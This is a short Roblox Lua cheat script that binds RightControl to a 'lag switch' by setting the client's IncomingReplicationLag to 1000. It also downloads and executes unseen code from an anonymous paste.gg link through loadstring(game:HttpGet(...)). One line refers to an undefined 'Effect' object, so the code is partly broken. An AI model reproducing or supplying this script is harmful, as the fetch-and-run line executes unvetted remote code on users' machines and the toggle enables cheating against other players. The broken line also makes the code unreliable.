_G.key = Enum.KeyCode.X
loadstring(game:HttpGet("https://paste.gg/p/anonymous/cb1c7198b269449eb8a2cf8ced061bed/files/4a98e88f82ee47388b3030a7f000b34e/raw", true))()
setting = settings().Network
toggle = false
function onKeyPress(inputObject, gameProcessedEvent)
    if inputObject.KeyCode == Enum.KeyCode.RightControl then        
        if toggle == false then
            setting.IncomingReplicationLag = 1000
            toggle = true
        else
	        setting.IncomingReplicationLag = 0
            Effect.Enabled = false
            toggle = false
        end
    end
end
game:GetService("UserInputService").InputBegan:connect(onKeyPress)
